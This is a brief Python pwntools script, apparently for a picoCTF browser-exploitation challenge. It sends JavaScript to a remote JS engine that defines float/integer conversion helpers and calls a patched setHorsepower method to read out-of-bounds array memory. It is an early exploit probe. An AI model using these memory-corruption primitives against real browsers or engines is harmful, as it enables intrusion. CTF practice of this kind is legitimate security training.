from pwn import * 
code = b'''
var tbuf = new ArrayBuffer(8);
var f64_buf = new Float64Array(tbuf);
var u64_buf = new Uint32Array(tbuf);

function ftoi(val) { // typeof(val) = float
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); 
}

function itof(val) { 
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}
function dbg(x) {
	console.log(ftoi(x).toString(16))
}
const buf = [1.1];
buf.setHorsepower(100);
dbg(buf[1])
dbg(buf[2])
'''
r = remote('mercury.picoctf.net', 60233)
r.sendline(str(len(code)).encode())
r.sendline(code)
r.interactive()

